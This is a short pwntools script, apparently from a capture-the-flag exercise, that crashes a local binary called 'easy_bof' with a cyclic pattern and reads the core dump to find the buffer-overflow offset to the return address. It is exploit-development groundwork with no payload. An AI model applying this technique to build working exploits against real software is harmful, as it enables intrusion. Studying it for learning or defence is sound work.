from pwn import *
elf = context.binary = ELF("./easy_bof")
io = process(elf.path)
io.sendline(cyclic(100))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 8))   #find(core.eip) 32bit
print("Offset:", offset)